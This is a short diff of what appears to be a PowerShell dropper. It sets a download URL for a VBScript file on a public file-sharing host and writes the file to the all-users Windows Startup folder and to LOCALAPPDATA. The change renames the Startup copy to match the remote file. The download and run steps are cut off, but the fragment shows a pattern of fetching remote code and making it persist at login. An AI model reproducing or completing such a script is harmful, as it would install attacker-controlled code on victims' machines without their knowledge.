@@ -1,6 +1,6 @@
 $url = "https://files.catbox.moe/9tn4y7.vbs"
 
-$destination1 = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\9lepqn.vbs"
+$destination1 = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\9tn4y7.vbs"
 $localAppData = $env:LOCALAPPDATA
 $destination2 = Join-Path $localAppData "9lepqn.vbs"
 
